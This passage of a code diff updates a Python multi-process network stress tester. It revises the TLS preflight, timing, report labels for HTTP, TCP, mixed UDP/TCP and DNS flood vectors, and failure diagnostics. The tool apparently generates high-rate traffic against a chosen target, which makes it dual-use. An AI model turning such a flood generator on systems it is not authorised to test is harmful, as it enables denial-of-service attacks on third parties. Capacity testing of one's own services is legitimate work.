         print(hr("连通性预检"))
-        ok = False
-        if is_web:
-            ctx = None
-            if use_tls:
-                try:
-                    ctx = build_ssl_context(tls_verify, tls_version, alpn, cipher)
-                except Exception as e:
-                    print("  ! TLS 上下文构建失败: %s" % e)
-            ok, msg = preflight(host, port, use_tls, ctx, sni)
-        else:
-            ok, msg = preflight(host, port, False, None, None)
+        ctx = None
+        if use_tls:
+            try:
+                ctx = build_ssl_context(tls_verify, tls_version, alpn, cipher)
+            except Exception as e:
+                print("  ! TLS 上下文构建失败: %s" % e)
+        ok, msg = preflight(host, port, use_tls, ctx, sni)
         print("  预检结果  : %s" % ("通过 - " + msg if ok else "失败 - " + msg))
         if not ok:
             print("  [!] 目标不可达, 继续压测大概率全失败。")
@@ -1300,8 +1655,8 @@ def run(cfg):
     worker_errors = {}   # wid -> 异常信息
     kinds = {}           # 错误分类聚合
     lp, lb = 0, 0
-    last_rx, last_rx_t = iface_rx_bytes(), time.time()
-    t0 = time.time()
+    last_rx, last_rx_t = iface_rx_bytes(), now()
+    t0 = now()
     stop = threading.Event()
 
     def collector():
@@ -1338,20 +1693,29 @@ def run(cfg):
     threading.Thread(target=collector, daemon=True).start()
 
     tls_mode = cfg.get("use_tls", False)
+    # 收尾缓冲: 必须覆盖"最后一条请求还在等响应"的时间。
+    # 只有 web 模式才需要等响应, 其他向量发完即结束, 固定 2 秒足够。
+    # 按模式区分可以省掉无谓的等待 (resp_timeout 默认 5 时能省 4 秒)。
+    if cfg.get("mode") in ("http", "https"):
+        tail = max(2, int(cfg.get("resp_timeout", 2) or 2) + 1)
+    else:
+        tail = 2
     try:
-        while time.time() - t0 < cfg["duration"] + 2:
+        while now() - t0 < cfg["duration"] + tail:
             time.sleep(1)
-            el = time.time() - t0
+            el = now() - t0
             pps = agg["p"] - lp
             db = agg["b"] - lb
             lp, lb = agg["p"], agg["b"]
             mbps = db * 8 / 1e6
 
             rx = iface_rx_bytes()
-            now = time.time()
+            # 注意: 不能叫 now, 否则会遮蔽模块级 now() 函数,
+            # 导致整个 run() 里 now 变成局部变量 -> UnboundLocalError
+            now_t = now()
             # Windows 的 GetIfTable 计数器是 32 位, 会在 4GiB 处回绕
-            rxb = rx_delta(rx, last_rx) * 8 / 1e6 / max(0.001, now - last_rx_t)
-            last_rx, last_rx_t = rx, now
+            rxb = rx_delta(rx, last_rx) * 8 / 1e6 / max(0.001, now_t - last_rx_t)
+            last_rx, last_rx_t = rx, now_t
 
             if tls_mode:
                 hs_total = agg["tk"] + agg["tf"]
@@ -1376,7 +1740,10 @@ def run(cfg):
                 p.terminate()
         for p in procs:
             p.join(timeout=2)
-        el = max(0.001, time.time() - t0)
+        el = max(0.001, now() - t0)
+        # 平均速率只用"实际测量窗口"作分母: 收尾缓冲期间 worker 已在退出,
+        # 那段空转不该计入, 否则会把平均值稀释。
+        meas = max(0.001, min(el, float(cfg["duration"])))
         alive = sum(1 for p in procs if p.is_alive())
         print("\n\n" + hr("测试报告"))
         print("  目标        : %s://%s:%d  [%s]"
@@ -1386,15 +1753,30 @@ def run(cfg):
         print("  总流量      : %.3f GB  (%.2f Gbit)" % (agg["b"] / 1e9, agg["b"] * 8 / 1e9))
         print("  收到数据    : %.3f GB" % (agg["rb"] / 1e9))
         print("  建连尝试    : %s" % format(agg["at"], ","))
-        print("  成功连接    : %s" % format(agg["c"], ","))
+        # "成功连接"在不同向量/模式下语义不同, 标注清楚避免误读
+        mode_now = cfg.get("mode")
+        if mode_now in ("http", "https"):
+            if cfg.get("reuse", True):
+                conn_label = "长连接数 (连接复用, 每条承载多个请求)"
+            else:
+                conn_label = "建连次数 (每请求新建连接)"
+        elif mode_now == "tcp":
+            conn_label = "建连次数"
+        elif mode_now == "mix":
+            # mix = UDP + TCP 并行, TCP 部分会真实建连, 不能标成"恒为 0"
+            conn_label = "TCP 建连次数 (混合向量中的 TCP 部分)"
+        else:
+            conn_label = "TCP 建连 (本向量不走连接, 恒为 0)"
+        print("  成功连接    : %s   %s" % (format(agg["c"], ","), conn_label))
         print("  错误/超时   : %s" % format(agg["e"], ","))
         if tls_mode:
             print("  TLS 握手成功: %s" % format(agg["tk"], ","))
             print("  TLS 握手失败: %s" % format(agg["tf"], ","))
             if agg["tk"] + agg["tf"] > 0:
                 print("  握手成功率  : %.2f%%" % (agg["tk"] * 100.0 / (agg["tk"] + agg["tf"])))
-        print("  平均速率    : %s pps  |  %.2f Mbps"
-              % (format(int(agg["p"] / el), ","), agg["b"] * 8 / el / 1e6))
+        print("  平均速率    : %s pps  |  %.2f Mbps   (按 %.0fs 测量窗口)"
+              % (format(int(agg["p"] / meas), ","), agg["b"] * 8 / meas / 1e6,
+                 meas))
         print("  上报进程    : %d/%d  (存活的 %d)"
               % (len(latest), len(procs), alive))
 
@@ -1413,6 +1795,7 @@ def run(cfg):
                 "resp_eof":       "响应未完成即被关闭",
                 "resp_bad":       "响应格式异常",
                 "resp_write_err": "发送失败",
+                "dns_no_reply":   "DNS 查询无应答",
                 "other":          "其他",
             }
             for k, v in sorted(kinds.items(), key=lambda x: -x[1])[:8]:
@@ -1452,6 +1835,18 @@ def run(cfg):
         if agg["e"] > agg["c"] * 10 and agg["c"] > 0 and crash == 0 and fde == 0:
             diag.append("失败率极高 (%.1f%%): 主要瓶颈在本机而非目标"
                         % (agg["e"] * 100.0 / max(1, agg["at"])))
+
+        # ---- DNS 专项: 无应答是软信号, 不当硬失败 ----
+        nrep = kinds.get("dns_no_reply", 0)
+        if nrep > 0:
+            diag.append("DNS 无应答 %s 次: 属软信号, 不一定是失败 — "
+                        "若「收到数据」不为 0 说明服务器在正常回包, "
+                        "只是本机排空窗口内没读到 (RTT 偏高或洪峰丢弃)"
+                        % format(nrep, ","))
+            if agg["rb"] > 0 and agg["e"] > 0 and nrep * 100.0 / agg["e"] >= 80:
+                diag.append("  参考: 本次已收到 %.3f GB 响应, 服务器工作正常, "
+                            "以「发出 pps」和「收到数据」为准判读" % (agg["rb"] / 1e9))
+
         if diag:
             print(hr("根因诊断"))
             for d in diag:
@@ -1466,10 +1861,6 @@ def run(cfg):
 
 def main():
     setup_console()
-    if IS_WIN:
-        # Windows 多进程用 spawn, 子进程会重新导入本模块。
-        # 必须保证子进程不会再次进入交互流程。
-        pass
     while True:
         cfg = collect_config()
         run(cfg)
